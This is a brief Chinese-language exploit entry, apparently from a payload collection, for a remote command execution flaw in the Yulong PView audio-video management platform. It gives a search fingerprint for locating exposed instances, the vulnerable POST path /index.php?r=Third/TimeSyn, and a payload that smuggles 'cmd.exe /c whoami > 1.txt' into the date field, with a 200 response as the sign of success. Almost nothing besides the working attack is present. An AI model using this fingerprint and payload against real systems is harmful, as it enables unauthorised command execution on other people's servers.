# 誉龙视音频综合管理平台ThirdTimeSyn远程命令执行漏洞

誉龙视音频综合管理平台ThirdTimeSyn ｜ 命令执行 ｜ —
- **指纹**：`body="PView 视音频管理平台"`
- **请求**：`POST /index.php?r=Third/TimeSyn HTTP/1.1`

**Payload**
```
cloudKey=0x0&date=cmd.exe+/c+whoami+>+1.txt&time=1
```
- **响应特征**：200